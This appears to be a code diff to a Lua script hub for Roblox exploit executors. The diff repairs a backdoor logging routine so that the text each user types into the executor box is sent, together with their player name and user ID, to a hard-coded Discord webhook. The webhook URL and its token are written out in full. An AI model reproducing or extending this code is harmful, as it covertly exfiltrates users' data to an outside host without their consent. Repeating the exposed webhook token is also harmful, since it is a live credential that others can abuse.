@@ -1629,7 +1629,8 @@ end
 local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then
     local player = game:GetService("Players").LocalPlayer
-    local contentMessage = "**User: `" .. player.Name .. "` | `" .. player.UserId .. "`** GUI.Executor.ExecutorBox.TextBox.Text"
+local executorText=GUI.Executor.ExecutorBox.TextBox.Text
+local contentMessage="**User: `"..player.Name.."` | `"..player.UserId.."`** "..executorText
 
     request({
         Url = "https://discord.com/api/webhooks/1395137173237268571/I3rrbp8lFIV74cMDiCk2EGGBBKjj4KYVWokR8GJbTvoYHSljmPu6Zh3pmzk6u1MrvWgI",
